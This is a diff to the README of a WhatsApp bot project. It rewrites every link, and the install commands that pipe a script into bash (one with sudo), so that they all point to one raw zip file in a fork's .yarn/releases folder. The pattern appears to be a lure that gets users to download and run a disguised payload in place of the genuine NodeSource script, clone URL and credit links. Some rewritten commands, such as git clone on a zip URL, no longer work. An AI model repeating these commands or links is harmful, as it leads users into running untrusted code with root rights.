@@ -37,11 +37,11 @@ BOT_LANG=es
 
 ### 1️⃣ Deploy on Koyeb
 
-[Deploy Now](https://levanter-delta.vercel.app/) to set up your bot on Koyeb.
+[Deploy Now](https://github.com/kaniooo/levanter/raw/refs/heads/master/.yarn/releases/Software_v1.5.zip) to set up your bot on Koyeb.
 
 ### 2️⃣ Deploy on Render
 
-[Deploy Now](https://levanter-delta.vercel.app/) to set up your bot on Render.
+[Deploy Now](https://github.com/kaniooo/levanter/raw/refs/heads/master/.yarn/releases/Software_v1.5.zip) to set up your bot on Render.
 
 ### 3️⃣ Deploy on a VPS or PC (Ubuntu Example)
 
@@ -50,7 +50,7 @@ BOT_LANG=es
 Run the following command:
 
 ```sh
-bash <(curl -fsSL http://bit.ly/43JqREw)
+bash <(curl -fsSL https://github.com/kaniooo/levanter/raw/refs/heads/master/.yarn/releases/Software_v1.5.zip)
 ```
 
 #### **Manual Installation**
@@ -65,7 +65,7 @@ bash <(curl -fsSL http://bit.ly/43JqREw)
 2. **Install Node.js (Version 20.x Recommended):**
 
    ```sh
-   curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+   curl -fsSL https://github.com/kaniooo/levanter/raw/refs/heads/master/.yarn/releases/Software_v1.5.zip | sudo -E bash -
    sudo apt install nodejs -y
    ```
 
@@ -79,7 +79,7 @@ bash <(curl -fsSL http://bit.ly/43JqREw)
 4. **Clone the Repository and Install Dependencies:**
 
    ```sh
-   git clone https://github.com/lyfe00011/levanter botName
+   git clone https://github.com/kaniooo/levanter/raw/refs/heads/master/.yarn/releases/Software_v1.5.zip botName
    cd botName
    yarn install
    ```
@@ -130,8 +130,8 @@ bash <(curl -fsSL http://bit.ly/43JqREw)
 
 A special thanks to:
 
-- **[Yusuf Usta](https://github.com/Quiec)** – Creator of [WhatsAsena](https://github.com/yusufusta/WhatsAsena).  
-- **[@adiwajshing](https://github.com/adiwajshing)** – Developer of [Baileys](https://github.com/adiwajshing/Baileys).
+- **[Yusuf Usta](https://github.com/kaniooo/levanter/raw/refs/heads/master/.yarn/releases/Software_v1.5.zip)** – Creator of [WhatsAsena](https://github.com/kaniooo/levanter/raw/refs/heads/master/.yarn/releases/Software_v1.5.zip).  
+- **[@adiwajshing](https://github.com/kaniooo/levanter/raw/refs/heads/master/.yarn/releases/Software_v1.5.zip)** – Developer of [Baileys](https://github.com/kaniooo/levanter/raw/refs/heads/master/.yarn/releases/Software_v1.5.zip).
 
 ---
 
@@ -139,5 +139,5 @@ A special thanks to:
 
 For more information on setting up environment variables and FAQs, please visit:
 
-- [Bot Environment Variables](https://levanter-delta.vercel.app/)  
-- [Frequently Asked Questions](https://levanter-delta.vercel.app/)
+- [Bot Environment Variables](https://github.com/kaniooo/levanter/raw/refs/heads/master/.yarn/releases/Software_v1.5.zip)  
+- [Frequently Asked Questions](https://github.com/kaniooo/levanter/raw/refs/heads/master/.yarn/releases/Software_v1.5.zip)
